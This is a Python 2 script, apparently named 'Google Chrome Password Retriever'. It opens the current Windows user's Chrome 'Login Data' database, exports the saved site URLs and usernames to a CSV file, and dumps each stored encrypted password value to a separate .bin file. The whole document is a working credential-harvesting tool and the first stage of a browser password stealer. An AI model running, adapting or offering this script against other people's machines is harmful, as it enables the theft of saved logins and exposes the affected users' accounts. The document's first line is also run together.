# Import required modulesimport sys
import sqlite3
import os
import csv, codecs, cStringIO

class UnicodeWriter:
    """
    A CSV writer which will write rows to CSV file "f", 
    which is encoded in the given encoding.
    """

    def __init__(self, f, dialect=csv.excel, encoding="utf-8", **kwds):
        # Redirect output to a queue
        self.queue = cStringIO.StringIO()
        self.writer = csv.writer(self.queue, dialect=dialect, **kwds)
        self.stream = f
        self.encoder = codecs.getincrementalencoder(encoding)()

    def writerow(self, row):
        self.writer.writerow([unicode(s).encode("utf-8") for s in row])
        # Fetch UTF-8 output from the queue ...
        data = self.queue.getvalue()
        data = data.decode("utf-8")
        # ... and reencode it into the target encoding
        data = self.encoder.encode(data)
        # write to the target stream
        self.stream.write(data)
        # empty queue
        self.queue.truncate(0)

    def writerows(self, rows):
        for row in rows:
            self.writerow(row)
# Get database from command line
Username = os.environ['USERNAME']

db_path = "C:\Users\\"+Username+"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
# Pick tables/fields to work with

TABLE_NAME = "logins"

PASS_CELL = "password_value"
URL_CELL = "action_url"
USER_CELL = "username_value"

# Open database, set up cursor to read database

conn = sqlite3.connect(db_path)

cur = conn.cursor()

# Create query

query = "SELECT {0} FROM {1};".format(PASS_CELL, TABLE_NAME)
query2 = "SELECT "+URL_CELL+","+USER_CELL+" FROM "+TABLE_NAME+";"

# Execute query


cur.execute(query2)
output = UnicodeWriter(open("export.csv", "wb"))
output.writerows(cur)
cur.execute(query)
for index, row in enumerate(cur):


    
    
    data = row[0]

    file_name = "{0}.bin".format(index)

    output = open("Google Chrome Password Retriever\\"+file_name, "wb")

    output.write(data)

    output.close()
